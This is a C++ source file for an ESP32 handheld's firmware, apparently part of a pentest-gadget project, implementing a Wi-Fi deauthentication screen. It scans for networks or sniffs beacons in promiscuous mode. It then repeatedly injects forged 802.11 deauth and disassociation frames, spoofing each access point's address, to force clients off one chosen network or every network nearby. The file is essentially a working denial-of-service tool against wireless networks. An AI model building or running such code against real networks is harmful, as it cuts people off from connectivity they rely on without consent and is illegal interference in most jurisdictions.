#include "WifiDeautherScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "utils/WifiAttackUtil.h"
#include "ui/actions/ShowStatusAction.h"

#include <WiFi.h>

// ── Static definitions ────────────────────────────────────────────────────

WifiDeautherScreen::ApEntry WifiDeautherScreen::_allTargets[MAX_ALL] = {};
int          WifiDeautherScreen::_allCount = 0;
portMUX_TYPE WifiDeautherScreen::_allLock  = portMUX_INITIALIZER_UNLOCKED;

// ── Destructor ────────────────────────────────────────────────────────────

WifiDeautherScreen::~WifiDeautherScreen()
{
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
}

// ── Lifecycle ─────────────────────────────────────────────────────────────

void WifiDeautherScreen::onInit()
{
  _state = STATE_MAIN;
  _showMain();
}

void WifiDeautherScreen::onItemSelected(uint8_t index)
{
  if (_state == STATE_MAIN) {
    if (index == 0) {
      _mode = (_mode == MODE_TARGET) ? MODE_ALL : MODE_TARGET;
      _showMain();
    } else if (_mode == MODE_TARGET) {
      if (index == 1) _selectWifi();
      if (index == 2) _startDeauth();
    } else {  // MODE_ALL
      if (index == 1) _startDeauth();
    }
  } else if (_state == STATE_SELECT_WIFI && index < _scanCount) {
    _target.ssid    = _scanLabels[index];
    _target.channel = atoi(_scanLabels[index] + 1);
    sscanf(_scanValues[index], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &_target.bssid[0], &_target.bssid[1], &_target.bssid[2],
           &_target.bssid[3], &_target.bssid[4], &_target.bssid[5]);
    _showMain();
  }
}

void WifiDeautherScreen::onUpdate()
{
  if (_state != STATE_DEAUTHING) {
    ListScreen::onUpdate();
    return;
  }

  if (_state == STATE_DEAUTHING) {
    if (Uni.Nav->wasPressed()) {
      const auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
        _stopDeauth();
        return;
      }
    }

    _spinIdx = (_spinIdx + 1) % 4;

    if (_mode == MODE_ALL) {
      _deauthAll();
      String msg = String("[") + _spinner[_spinIdx] + "] Deauthing " + _allCount + " APs...";
      _drawStatus(msg.c_str());
    } else if (_attacker) {
      _attacker->deauthenticate(_target.bssid, _target.channel);
      String msg = String("[") + _spinner[_spinIdx] + "] Deauthing " + _target.ssid + "...";
      _drawStatus(msg.c_str());
    }

    delay(100);
  }
}

void WifiDeautherScreen::onBack()
{
  if (_state == STATE_SELECT_WIFI) {
    _showMain();
  } else if (_state == STATE_DEAUTHING) {
    _stopDeauth();
  } else {
    Screen.setScreen(new WifiMenuScreen());
  }
}

// ── Private ───────────────────────────────────────────────────────────────

void WifiDeautherScreen::_showMain()
{
  _state = STATE_MAIN;
  _modeSub = (_mode == MODE_TARGET) ? "Target" : "All";
  _mainItems[0] = {"Mode", _modeSub.c_str()};

  if (_mode == MODE_TARGET) {
    _targetSub = _target.ssid;
    _mainItems[1] = {"Target WiFi", _targetSub.c_str()};
    _mainItems[2] = {"Start Deauth"};
    setItems(_mainItems, 3);
  } else {
    _mainItems[1] = {"Start Deauth"};
    setItems(_mainItems, 2);
  }
}

void WifiDeautherScreen::_selectWifi()
{
  _state = STATE_SELECT_WIFI;
  ShowStatusAction::show("Scanning...", 0);

  WiFi.mode(WIFI_STA);
  const int total = WiFi.scanNetworks();

  if (total == 0) {
    ShowStatusAction::show("No networks found");
    _showMain();
    return;
  }

  _scanCount = total > MAX_SCAN ? MAX_SCAN : total;
  for (int i = 0; i < _scanCount; i++) {
    snprintf(_scanLabels[i], sizeof(_scanLabels[i]), "[%2d] %s",
             WiFi.channel(i), WiFi.SSID(i).c_str());
    snprintf(_scanValues[i], sizeof(_scanValues[i]), "%s",
             WiFi.BSSIDstr(i).c_str());
    _scanItems[i] = {_scanLabels[i], _scanValues[i]};
  }

  setItems(_scanItems, _scanCount);
}

void WifiDeautherScreen::_startDeauth()
{
  if (_mode == MODE_TARGET) {
    const MacAddr blank = {0, 0, 0, 0, 0, 0};
    if (_target.ssid == "-" && memcmp(_target.bssid, blank, 6) == 0) {
      ShowStatusAction::show("Select a target first!");
      return;
    }
  }

  _state   = STATE_DEAUTHING;
  _spinIdx = 0;

  if (_mode == MODE_ALL) {
    portENTER_CRITICAL(&_allLock);
    memset(_allTargets, 0, sizeof(_allTargets));
    _allCount = 0;
    portEXIT_CRITICAL(&_allLock);

    // AP mode required for esp_wifi_80211_tx; enable promiscuous after
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP("No Internet", "12345678", 1, true);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&WifiDeautherScreen::_beaconCb);
    _drawStatus("[...] Scanning for APs...");
  } else {
    _attacker = new WifiAttackUtil();
    _drawStatus(("Deauthing " + _target.ssid + "...").c_str());
  }
}


void WifiDeautherScreen::_stopDeauth()
{
  if (_mode == MODE_ALL) {
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
  } else {
    if (_attacker) {
      delete _attacker;
      _attacker = nullptr;
    }
  }
  _drawStatus("Deauth stopped.");
  delay(1000);
  _showMain();
}

void WifiDeautherScreen::_deauthAll()
{
  // Snapshot under lock so we don't block the beacon callback
  ApEntry local[MAX_ALL];
  int count;
  portENTER_CRITICAL(&_allLock);
  memcpy(local, _allTargets, sizeof(_allTargets));
  count = _allCount;
  portEXIT_CRITICAL(&_allLock);

  // Deauth frame template — broadcast dest, AP as both source and BSSID
  uint8_t frame[26] = {
    0xc0, 0x00,                          // Frame Control: deauth
    0x3a, 0x01,                          // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC (filled per AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (filled per AP)
    0x00, 0x00,                          // Sequence control
    0x02, 0x00                           // Reason: invalid authentication
  };

  static uint16_t seq = 0;

  for (int i = 0; i < count; i++) {
    if (!local[i].valid) continue;
    esp_wifi_set_channel(local[i].channel, WIFI_SECOND_CHAN_NONE);
    memcpy(&frame[10], local[i].bssid, 6);
    memcpy(&frame[16], local[i].bssid, 6);
    memcpy(&frame[22], &seq, 2);
    seq++;
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    frame[0] = 0xa0;  // also send disassoc
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    frame[0] = 0xc0;  // restore for next iteration
  }
}

void WifiDeautherScreen::_drawStatus(const char* msg)
{
  TFT_eSprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), bodyH());
  sp.fillSprite(TFT_BLACK);

  sp.setTextDatum(MC_DATUM);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  sp.drawString(msg, bodyW() / 2, bodyH() / 2);

  sp.setTextDatum(BC_DATUM);
  sp.setTextColor(TFT_DARKGREY, TFT_BLACK);
  sp.drawString("BACK / ENTER: Stop", bodyW() / 2, bodyH());

  sp.pushSprite(bodyX(), bodyY());
  sp.deleteSprite();
}

// ── Beacon callback (IRAM_ATTR — must be in .cpp) ─────────────────────────

void IRAM_ATTR WifiDeautherScreen::_beaconCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (type != WIFI_PKT_MGMT || buf == nullptr) return;

  const auto     pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* pay = pkt->payload;
  const size_t   len = pkt->rx_ctrl.sig_len;

  if (len < 10) return;

  const uint8_t fc_sub = (pay[0] >> 4) & 0x0F;
  if (fc_sub != 8) return;  // beacon only

  // BSSID is addr3 (offset 16) in beacon management frame
  if (len < 22) return;
  const uint8_t* bssid = pay + 16;
  const uint8_t  ch    = pkt->rx_ctrl.channel;

  portENTER_CRITICAL(&_allLock);

  // Check if already present
  for (int i = 0; i < _allCount; i++) {
    if (memcmp(_allTargets[i].bssid, bssid, 6) == 0) {
      _allTargets[i].channel = ch;  // update channel in case it changed
      portEXIT_CRITICAL(&_allLock);
      return;
    }
  }

  // Add new entry
  if (_allCount < MAX_ALL) {
    memcpy(_allTargets[_allCount].bssid, bssid, 6);
    _allTargets[_allCount].channel = ch;
    _allTargets[_allCount].valid   = true;
    _allCount++;
  }

  portEXIT_CRITICAL(&_allLock);
}